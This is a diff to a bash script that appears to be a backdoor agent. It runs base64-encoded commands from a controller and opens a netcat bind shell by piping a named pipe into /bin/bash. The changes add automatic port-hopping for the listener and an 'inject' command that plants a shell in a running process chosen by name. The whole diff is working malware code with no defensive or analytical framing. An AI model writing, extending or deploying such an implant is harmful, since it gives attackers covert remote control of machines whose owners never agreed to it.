@@ -20,8 +20,11 @@ pull(){
         echo $fName
     else
         cmd=$(echo $cmd | base64 --decode)
-        if [[ $cmd == "shell" ]]; then
+        cmdArray=($cmd)
+        if [[ ${cmdArray[0]} == "shell" ]]; then
             spawn_shell &
+        elif [[ ${cmdArray[0]} == "inject" ]]; then
+            inject ${cmdArray[1]}
         else
             output=$($cmd)
 	        return_output
@@ -72,20 +75,24 @@ spawn_shell(){
     i=true
     x=0
     shell="/tmp/pipe"
+    port=9999
     while $i; do
+        chk=$(netstat -tunalp | grep -c $port)
         if [[ -f $shell ]]; then    # current shell file exists
-            shell=$shell$x          # increment file number
+            shell="$shell$x"        # increment file number
             let x=x+1
+        elif [[ $chk -ge 1 ]]; then
+            let port=port+1
         else
             mkfifo /tmp/pipe                                            # make file to store nc output
-            cat /tmp/pipe | /bin/bash 2>&1 | nc -l 9999 > /tmp/pipe &   # cat file to bash, pipe bash output
+            cat /tmp/pipe | /bin/bash 2>&1 | nc -l $port > /tmp/pipe &   # cat file to bash, pipe bash output
             i=false
         fi
     done
 }
 
 # Inject a nc shell into the specified process
-inject_shell(){
+inject(){
     pname=$1
     pid=$(pgrep $pname)
     ./inject_shell $pid
